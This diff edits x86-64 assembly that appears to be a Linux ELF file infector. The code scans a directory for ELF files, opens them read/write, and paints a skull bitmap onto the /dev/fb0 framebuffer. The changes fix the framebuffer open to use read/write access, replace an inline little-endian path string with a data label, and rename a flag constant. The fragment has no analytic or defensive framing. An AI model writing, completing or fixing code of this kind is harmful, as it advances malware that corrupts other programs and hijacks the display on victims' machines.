@@ -94,15 +94,15 @@ targetdirlen equ $-targetdir
 
 fd	dq 0
 fdlen equ $-fd
-;framebuffer:
-;	db `//dev//fb0`,0
+framebuffer:
+	db `//dev//fb0`,0
 ;framebuflen equ $-framebuffer
 ;;
 STDOUT			equ 0x1
 
 
 ;open() syscall parameter reference 
-OPEN_RDWR		equ 0x2
+O_RDWR			equ 0x2
 O_RDONLY		equ 0x0
 
 
@@ -285,12 +285,14 @@ _write:
 ;		;lea rsi, skullbitmap
 	;	mov rax, 0x2f666230
 	;	mov rax, 0x2f6465762f666230
-		mov rax, 0x3062662f7665642f  ;/dev/fb0 in little-endian
-		mov [r14 + 100], rax
-		lea rdi, [r14 + 100]
+		
+		;mov rax, 0x3062662f7665642f  ;/dev/fb0 in little-endian
+		;mov [r14 + 100], rax
+		;lea rdi, [r14 + 100]
+		lea rdi, framebuffer
 		xor rsi, rsi 		;no flags
 		add rsi, 0x02000000
-		mov rdx, O_RDONLY	;open read-only
+		mov rdx, O_RDWR	;open read write
 		mov rax, SYS_OPEN
 		syscall
 		
@@ -302,7 +304,7 @@ _write:
 		;mov rdi, rsp
 ;		;pop rdi
 ;		mov rdi, STDOUT
-		mov rsi, skullbitmap
+		lea rsi, skullbitmap
 		mov rdx, paintlen
 		mov rax, SYS_WRITE
 		syscall
@@ -346,7 +348,7 @@ check_file:
 	jne checknext 
 	check_elf:
 		lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
-		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
+		mov rsi, O_RDWR 					;flags - read/write in rsi
 		xor rdx, rdx						;mode - 0
 		mov rax, SYS_OPEN
 		syscall
